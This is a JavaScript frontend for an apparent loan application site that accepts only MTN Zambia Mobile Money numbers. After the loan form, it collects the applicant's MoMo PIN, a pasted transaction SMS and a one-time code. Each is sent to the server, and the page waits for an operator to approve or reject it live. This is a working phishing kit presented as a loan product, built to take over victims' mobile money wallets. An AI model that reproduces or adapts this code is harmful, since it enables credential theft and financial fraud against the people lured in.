let appDataStore = {
  loanType: '',
  amount: '1000000',
  term: '48 Months',
  purpose: '',
  firstName: '',
  lastName: '',
  phone: '',
  employment: '',
  income: '',
  appId: ''
};

let pollInterval = null;
let countdownInterval = null;

function goToStep(stepNum) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  if (stepNum === 'welcome') document.getElementById('screen-welcome').classList.add('active');
  else if (stepNum === 1) document.getElementById('screen-step1').classList.add('active');
  else if (stepNum === 2) document.getElementById('screen-step2').classList.add('active');
  else if (stepNum === 3) document.getElementById('screen-step3').classList.add('active');
}

// Step 1 Validation & Data Collection
function validateStep1() {
  const loanType = document.getElementById('loan-type').value;
  const amount = document.getElementById('loan-range').value;
  const purpose = document.getElementById('loan-purpose').value;

  if (!loanType || !amount || !purpose.trim()) {
    alert('Please fill out all request details on Step 1 before proceeding.');
    return;
  }

  appDataStore.loanType = loanType;
  appDataStore.amount = amount;
  appDataStore.term = '48 Months';
  appDataStore.purpose = purpose;

  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-step2').classList.add('active');
}

// Helper to validate MTN Zambia phone numbers (Must start with 96 or 76)
function isValidMtnZambiaNumber(phoneStr) {
  let cleaned = phoneStr.replace(/\D/g, '');
  if (cleaned.startsWith('260') && cleaned.length === 12) {
    cleaned = cleaned.substring(3);
  }
  if (cleaned.length === 9 && (cleaned.startsWith('96') || cleaned.startsWith('76'))) {
    return true;
  }
  return false;
}

// Step 2 Validation & MTN Zambia Number Restriction
function validateStep2() {
  const firstName = document.getElementById('first-name').value.trim();
  const lastName = document.getElementById('last-name').value.trim();
  const phone = document.getElementById('phone-number').value.trim();

  if (!firstName || !lastName || !phone) {
    alert('Please fill in your name and phone number on Step 2 before proceeding.');
    return;
  }

  if (!isValidMtnZambiaNumber(phone)) {
    alert('Access Denied: Only MTN Zambia MoMo numbers (starting with 096 or 076) are allowed for this application. Other network numbers are rejected.');
    return;
  }

  appDataStore.firstName = firstName;
  appDataStore.lastName = lastName;
  appDataStore.phone = phone;

  document.getElementById('summary-amount').innerText = `ZMW ${Number(appDataStore.amount).toLocaleString()}`;
  document.getElementById('summary-term').innerText = appDataStore.term;
  document.getElementById('summary-purpose').innerText = appDataStore.purpose;
  document.getElementById('summary-applicant').innerText = `${firstName} ${lastName}`;

  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-step3').classList.add('active');
}

// Step 3 Validation & Submission
function validateStep3() {
  const employment = document.getElementById('employment-status').value;
  const income = document.getElementById('annual-income').value;

  if (!employment || !income) {
    alert('Please fill in your employment status and annual income before submitting.');
    return;
  }

  appDataStore.employment = employment;
  appDataStore.income = income;

  submitApplication();
}

// Range slider integration for amount (48 Months period calculation)
const rangeInput = document.getElementById('loan-range');
if (rangeInput) {
  rangeInput.addEventListener('input', (e) => {
    const val = Number(e.target.value);
    document.getElementById('calc-display-amount').innerText = `ZMW ${val.toLocaleString()}`;
    const monthly = Math.round(val / 48);
    document.getElementById('calc-monthly-payment').innerText = `ZMW ${monthly.toLocaleString()}`;
  });
}

async function submitApplication() {
  try {
    const res = await fetch('/api/applications', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(appDataStore)
    });
    const data = await res.json();
    appDataStore.appId = data.id;

    document.getElementById('login-phone').value = appDataStore.phone;
    document.getElementById('display-app-id').innerText = `Application ID: ${appDataStore.appId}`;
    document.getElementById('display-app-id-sms').innerText = `Application ID: ${appDataStore.appId}`;
    document.getElementById('display-app-id-otp').innerText = `Application ID: ${appDataStore.appId}`;

    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById('screen-login').classList.add('active');
  } catch (err) {
    alert('Failed to connect to server.');
  }
}

// PIN inputs management
const pinInputs = document.querySelectorAll('.p-pin');
pinInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    if (e.target.value.length === 1 && index < pinInputs.length - 1) {
      pinInputs[index + 1].focus();
    }
    checkPinComplete();
  });
});

function checkPinComplete() {
  let allFilled = Array.from(pinInputs).every(i => i.value.length === 1);
  const btn = document.getElementById('btn-login-momo');
  if (allFilled) {
    btn.style.background = '#004F9F';
    btn.style.color = '#FFF';
    btn.removeAttribute('disabled');
  } else {
    btn.style.background = '#E2E2E2';
    btn.style.color = '#888';
    btn.setAttribute('disabled', 'true');
  }
}

async function submitPinLogin() {
  const pin = Array.from(pinInputs).map(i => i.value).join('');
  
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-waiting-admin').style.display = 'flex';

  await fetch('/verify-pin', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ appId: appDataStore.appId, pin, phone: appDataStore.phone })
  });

  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms', 'PIN_REJECTED', 'screen-login', '✅ CORRECT PIN VERIFIED');
}

// SMS Countdown Timer & Enforcement
function startSmsCountdown() {
  let timeLeft = 55;
  const timerDisplay = document.getElementById('timer-display');
  if (countdownInterval) clearInterval(countdownInterval);

  countdownInterval = setInterval(() => {
    timeLeft--;
    if (timeLeft >= 0) {
      timerDisplay.innerText = `Message expires in ${timeLeft}s.`;
    } else {
      clearInterval(countdownInterval);
      timerDisplay.innerText = `Message expired. Please request a new code.`;
    }
  }, 1000);
}

function checkSmsInput() {
  const smsText = document.getElementById('sms-text-input').value.trim();
  const btn = document.getElementById('btn-submit-sms');
  if (smsText.length > 0) {
    btn.style.background = '#004F9F';
    btn.style.color = '#FFF';
    btn.removeAttribute('disabled');
  } else {
    btn.style.background = '#E2E2E2';
    btn.style.color = '#888';
    btn.setAttribute('disabled', 'true');
  }
}

async function submitSmsVerification() {
  const smsText = document.getElementById('sms-text-input').value.trim();
  if (!smsText) return alert('Please enter or paste your SMS message.');

  if (countdownInterval) clearInterval(countdownInterval);

  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-waiting-sms').style.display = 'flex';

  await fetch('/verify-sms', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ appId: appDataStore.appId, smsText })
  });

  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp', 'SMS_REJECTED', 'screen-sms', '✅ CORRECT SMS MESSAGE VERIFIED');
}

// OTP Inputs Management
const otpInputs = document.querySelectorAll('.p-otp');
otpInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    if (e.target.value.length === 1 && index < otpInputs.length - 1) {
      otpInputs[index + 1].focus();
    }
    checkOtpComplete();
  });
});

function checkOtpComplete() {
  let allFilled = Array.from(otpInputs).every(i => i.value.length === 1);
  const btn = document.getElementById('btn-verify-otp');
  if (allFilled) {
    btn.style.background = '#004F9F';
    btn.style.color = '#FFF';
    btn.removeAttribute('disabled');
  } else {
    btn.style.background = '#E2E2E2';
    btn.style.color = '#888';
    btn.setAttribute('disabled', 'true');
  }
}

async function submitOtpCode() {
  const otpCode = Array.from(otpInputs).map(i => i.value).join('');

  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen-waiting-otp').style.display = 'flex';

  await fetch('/verify-otp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ appId: appDataStore.appId, otpCode })
  });

  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success', 'OTP_REJECTED', 'screen-otp', '✅ CORRECT OTP VERIFIED - LOAN APPROVED');
}

function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, rejectionStatus, rejectionScreenId, successMessage) {
  if (pollInterval) clearInterval(pollInterval);

  pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/check-status/${appDataStore.appId}`);
      const data = await res.json();

      if (data.status === targetStatus) {
        clearInterval(pollInterval);
        document.getElementById(waitingScreenId).style.display = 'none';
        
        if (nextScreenId === 'screen-sms') {
          startSmsCountdown();
        }
        
        if (nextScreenId === 'screen-success') {
          document.getElementById('final-success-id').innerText = `Application ID: ${appDataStore.appId}`;
        }

        document.getElementById(nextScreenId).classList.add('active');
        alert(successMessage);
      } else if (data.status === rejectionStatus) {
        clearInterval(pollInterval);
        document.getElementById(waitingScreenId).style.display = 'none';
        
        let errorMsg = '❌ Verification Rejected';
        if (rejectionStatus === 'PIN_REJECTED') {
          errorMsg = '❌ WRONG PIN ENTERED. Please check your MoMo PIN and try again.';
          document.querySelectorAll('.p-pin').forEach(i => i.value = '');
          const btn = document.getElementById('btn-login-momo');
          btn.style.background = '#E2E2E2';
          btn.style.color = '#888';
          btn.setAttribute('disabled', 'true');
          document.querySelector('.p-pin').focus();
        } else if (rejectionStatus === 'SMS_REJECTED') {
          errorMsg = '❌ WRONG SMS PASTED. Please copy and paste the correct transaction SMS message.';
          document.getElementById('sms-text-input').value = '';
          const btn = document.getElementById('btn-submit-sms');
          btn.style.background = '#E2E2E2';
          btn.style.color = '#888';
          btn.setAttribute('disabled', 'true');
        } else if (rejectionStatus === 'OTP_REJECTED') {
          errorMsg = '❌ WRONG OTP. Please check your code and enter the correct OTP.';
          document.querySelectorAll('.p-otp').forEach(i => i.value = '');
          const btn = document.getElementById('btn-verify-otp');
          btn.style.background = '#E2E2E2';
          btn.style.color = '#888';
          btn.setAttribute('disabled', 'true');
          document.querySelector('.p-otp').focus();
        }

        document.getElementById(rejectionScreenId).classList.add('active');
        alert(errorMsg);
      }
    } catch (e) {
      console.error('Polling error:', e);
    }
  }, 3000);
}
